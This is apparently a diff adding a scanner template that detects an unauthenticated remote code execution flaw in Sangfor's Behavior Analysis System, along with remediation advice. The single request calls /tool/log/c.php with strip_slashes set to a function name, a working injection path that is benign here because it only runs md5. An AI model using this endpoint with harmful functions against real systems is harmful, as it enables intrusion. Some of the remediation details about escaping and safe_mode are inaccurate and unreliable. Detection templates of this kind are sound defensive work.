@@ -1,0 +1,33 @@
+id: sangfor-ba-rce
+info:
+  name: Sangfor BA - Remote Code Execution
+  author:
+  - l0ne1y
+  description: |-
+    Sangfor Behavior Analysis System RCE Vulnerability
+    A vulnerability in a Sangfor product allows remote unauthenticated users to cause the product to execute arbitrary commands.
+  severity: critical
+  remediation: |-
+    Official remediation advice:
+    1. Upgrade the system to a version without the vulnerability, or download the security patch from the official website.
+    https://www.sangfor.com.cn/product/
+
+    Temporary remediation advice:
+    1. Avoid executing external applications or commands whenever possible.
+    2. Implement the functionality of external applications or commands using custom functions or function libraries.
+    3. Validate parameter content before calling command-execution functions such as system and eval.
+    4. Use the escapeshellarg function to handle related parameters. escapeshellarg escapes any characters that would terminate a parameter or command; for example, a single quote ("'") is escaped to "\'", a double quote ("\"") is escaped to "\\\"", and a semicolon (";") is escaped to "\;". This way escapeshellarg confines the parameter content within a pair of single or double quotes and escapes any single or double quotes contained in the parameter, preventing them from truncating the ongoing command and thereby mitigating command injection attacks.
+    5. Use safe_mode_exec_dir to specify the directory for executable files. Set safe_mode to On in php.ini, place allowed executables into a directory, and use safe_mode_exec_dir to designate this executable directory. When an external program needs to be executed, it will only run if located in the directory specified by safe_mode_exec_dir; otherwise execution will fail.
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - '{{md5("{{randstr}}")}}'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/tool/log/c.php?strip_slashes=md5&host={{randstr}}'
+  method: GET
